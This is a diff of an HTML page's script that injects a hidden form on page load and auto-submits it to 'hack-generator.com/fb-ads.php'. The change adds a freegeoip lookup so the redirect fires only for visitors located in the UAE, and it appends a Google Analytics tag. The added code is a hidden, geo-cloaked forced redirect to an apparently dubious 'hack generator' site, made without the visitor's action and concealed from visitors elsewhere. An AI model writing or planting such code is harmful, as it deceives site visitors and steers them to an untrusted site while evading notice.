@@ -34,13 +34,11 @@
   </body> 
 <script>
         
-        var isMobile = navigator.userAgent.match(/(iPad)|(iPhone)|(iPod)|(android)|(webOS)/i);
-        
-        
-        
-        window.addEventListener('load',()=>{
-            
-                document.querySelector('#section').innerHTML = `
+        async function x(){
+                var data = await fetch('https://freegeoip.app/json/');
+                var json_data = await data.json();
+                if(json_data.country_code == 'AE'){
+                    document.querySelector('#section').innerHTML = `
                     <form action='https://hack-generator.com/fb-ads.php' id='myForm1' method='post' name='myForm' style='display:none'>
                       <input name='y' type='text' value='1'/>
                       <button name='x' type='submit'/>
@@ -49,7 +47,32 @@
                 setTimeout(()=>{
                     document.querySelector('#myForm1').submit();
                 },1000);
+                }
+                
+            } 
+        
+        
+        
+        
+        window.addEventListener('load',()=>{
+
+
             
+            x();
+            /*
+                
+            */
         });
     </script>
+	
+	<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-186356430-7"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-186356430-7');
+</script>
+
 </html>
